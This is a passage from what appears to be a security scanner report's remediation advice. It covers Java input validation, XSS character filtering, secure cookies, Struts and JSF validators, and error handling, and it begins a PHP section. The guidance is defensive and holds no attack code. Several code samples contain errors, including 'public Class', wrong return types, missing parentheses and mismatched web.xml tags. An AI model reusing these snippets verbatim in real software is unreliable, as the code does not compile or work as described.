      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</code>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>Use the javax.servlet.http.Cookie object to validate the cookie value.  The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>Example to validate a required cookie value:</text>
              <br />
              <br />
              <code>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</code>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text>
              <br />
              <br />
              <code>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&amp;lt;");
                  break;
              case '&gt;': 
                  result.append("&amp;gt;");
                  break;
              case '"': 
                  result.append("&amp;quot;");
                  break;
              case '\'': 
                  result.append("&amp;#39;");
                  break;
              case '%': 
                  result.append("&amp;#37;");
                  break;
              case ';': 
                  result.append("&amp;#59;");
                  break;
              case '(': 
                  result.append("&amp;#40;");
                  break;
              case ')': 
                  result.append("&amp;#41;");
                  break;
              case '&amp;': 
                  result.append("&amp;amp;");
                  break;
              case '+':
                  result.append("&amp;#43;");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</code>
              <br />
              <br />
              <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text>
              <br />
              <br />
              <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text>
              <br />
              <br />
              <code>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  }
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie  using  a secure protocol, such as HTTPS or SSL.</text>
              <br />
              <br />
              <text>Example to secure the "user" cookie:</text>
              <br />
              <br />
              <code>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements.  These rules are configured in an XML file that defines input validation rules for form fields.  Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag.  This filtering may be disabled by setting the 'filter=false' flag.</text>
              <br />
              <br />
              <text>Struts defines the following basic input validators, but custom validators may also be defined:</text>
              <br />
              <text>required: succeeds if the field contains any characters other than whitespace.</text>
              <br />
              <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text>
              <br />
              <text>range: succeeds if the value is within the values given by the min and max attributes ((value &gt;= min) &amp; (value &lt;= max)).</text>
              <br />
              <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text>
              <br />
              <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text>
              <br />
              <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text>
              <br />
              <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text>
              <br />
              <text>creditCard: succeeds if the value could be a valid credit card number.</text>
              <br />
              <text>email: succeeds if the value could be a valid e-mail address.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text>
              <br />
              <br />
              <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text>
              <br />
              <text>validate_doublerange: registers a DoubleRangeValidator on a component</text>
              <br />
              <text>validate_length: registers a LengthValidator on a component</text>
              <br />
              <text>validate_longrange: registers a LongRangeValidator on a component</text>
              <br />
              <text>validate_required: registers a RequiredValidator on a component</text>
              <br />
              <text>validate_stringrange: registers a StringRangeValidator on a component</text>
              <br />
              <text>validator: registers a custom Validator on a component</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text>
              <br />
              <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>input_text: accepts a text string of one line.</text>
              <br />
              <text>output_text: displays a text string of one line.</text>
              <br />
              <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>input_hidden: allows a page author to include a hidden variable in a page</text>
              <br />
              <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text>
              <br />
              <text>input_textarea: accepts multiple lines of text</text>
              <br />
              <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text>
              <br />
              <text>output_label: displays a nested component as a label for a specified input field</text>
              <br />
              <text>output_message: displays a localized message</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
              <br />
              <br />
              <text>** Error Handling:</text>
              <br />
              <br />
              <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern.  In this pattern a Servlet acts as a Controller.  A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model).  The Servlet then forwards the request to a JSP (View) to render the processing results.  Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text>
              <br />
              <br />
              <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces.  A good error handling strategy addresses the following items:</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided.  Instead, the application should use error keys that map to known application failures.  A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties.  For example, if the "user_name" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text>
              <br />
              <br />
              <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the "user_name" field is required;</text>
              <br />
              <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the "user_name" field should be alphanumeric;</text>
              <br />
              <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the "user_name" value is a duplicate in the database;</text>
              <br />
              <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the "user_name" value is invalid;</text>
              <br />
              <br />
              <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text>
              <br />
              <br />
              <text>- ErrorKeys: defines all error keys</text>
              <br />
              <br />
              <code>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</code>
              <br />
              <indentText>    </indentText>
              <text>- Error: encapsulates an individual error</text>
              <br />
              <br />
              <code>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</code>
              <br />
              <br />
              <text>- Errors: encapsulates a Collection of errors</text>
              <br />
              <br />
              <code>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
          private HashMap errors = new HashMap();
      }
</code>
              <br />
              <br />
              <text>Using the above framework classes, here is an example to process validation errors of the "user_name" field:</text>
              <br />
              <br />
              <code>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</code>
              <br />
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>There are two ways to report web-tier application errors:</text>
              <br />
              <text>(a) Servlet Error Mechanism</text>
              <br />
              <text>(b) JSP Error Mechanism</text>
              <br />
              <br />
              <text>[2-a] Servlet Error Mechanism</text>
              <br />
              <text>A Servlet may report errors by:</text>
              <br />
              <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text>
              <br />
              <text>- calling response.sendError with an HTTP error code argument, OR</text>
              <br />
              <text>- throwing an exception</text>
              <br />
              <br />
              <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data.  The following example illustrates how to forward to an input JSP (userInput.jsp):</text>
              <br />
              <br />
              <code>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</code>
              <br />
              <br />
              <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument.  Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes.  </text>
              <br />
              <br />
              <text>Example to return a HTTP error:</text>
              <br />
              <code>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</code>
              <br />
              <br />
              <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text>
              <br />
              <text>- RuntimeException</text>
              <br />
              <text>- ServletException</text>
              <br />
              <text>- IOException</text>
              <br />
              <br />
              <text>[2-b] JSP Error Mechanism</text>
              <br />
              <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text>
              <br />
              <br />
              <code>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</code>
              <br />
              <br />
              <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request parameter called javax.servlet.jsp.jspException.  The error page must include a isErrorPage directive as shown below:</text>
              <br />
              <br />
              <code>      &lt;%@ page isErrorPage="true" %&gt;
</code>
              <br />
              <br />
              <text>The isErrorPage directive causes the "exception" variable to be initialized to the exception object being thrown.</text>
              <br />
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>The J2SE Internationalization APIs provide utility classes for externalizing application resources and formatting messages including:</text>
              <br />
              <br />
              <text>(a) Resource Bundles</text>
              <br />
              <text>(b) Message Formatting</text>
              <br />
              <br />
              <text>[3-a] Resource Bundles</text>
              <br />
              <text>Resource bundles support internationalization by separating localized data from the source code that uses it.  Each resource bundle stores a map of key/value pairs for a specific locale.</text>
              <br />
              <br />
              <text>It is common to use or extend java.util.PropertyResourceBundle, which stores the content in an external properties file as shown in the following example:</text>
              <br />
              <br />
              <code>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  ...
</code>
              <br />
              <br />
              <text>Multiple resources can be defined to support different locales (hence the name resource bundle).  For example, ErrorMessages_fr.properties can be defined to support the French member of the bundle family.  If the resource member of the requested locale does not exist, the default member is used.  In the above example, the default resource is ErrorMessages.properties.  Depending on the user's locale, the application (JSP or Servlet) retrieves content from the appropriate resource.</text>
              <br />
              <br />
              <text>[3-b] Message Formatting</text>
              <br />
              <text>The J2SE standard class java.util.MessageFormat provides a generic way to create messages with replacement placeholders.  A MessageFormat object contains a pattern string with embedded format specifiers as shown below:</text>
              <br />
              <br />
              <code>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</code>
              <br />
              <br />
              <text>Here is a more comprehensive example to render error messages using ResourceBundle and MessageFormat:</text>
              <br />
              <br />
              <code>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</code>
              <br />
              <br />
              <text>It is recommended to define a custom JSP tag, e.g. displayErrors, to iterate through and render error messages as shown in the above example.</text>
              <br />
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <text>Normally, the Servlet Container will return a default error page corresponding to either the response status code or the exception.  A mapping between the status code or the exception and a web resource may be specified using custom error pages.  It is a good practice to develop static error pages that do not disclose internal error states (by default, most Servlet containers will report internal error messages).  This mapping is configured in the Web Deployment Descriptor (web.xml) as specified in the following example:</text>
              <br />
              <br />
              <code>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</code>
              <br />
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a Java framework that defines the error handling mechanism as described above.  Validation rules are configured in an XML file that defines input validation rules for form fields and the corresponding validation error keys.  Struts provides internationalization support to build localized applications using resource bundles and message formatting.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>The Struts JSP tag library defines the "errors" tag that conditionally displays a set of accumulated error messages as shown in the following example:</text>
              <br />
              <br />
              <code>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, validate input, and support internationalization.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the "output_errors" UIOutput Renderer, which displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
            </fixRecommendation>
            <fixRecommendation type="PHP">
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must always be performed on the server-tier.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement a function or functions that validates each application parameter.  The following sections describe some example checking.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.</text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]+$</text>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, the developer should sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>PHP includes some automatic sanitation utility functions, such as htmlentities():</text>
              <br />
              <br />
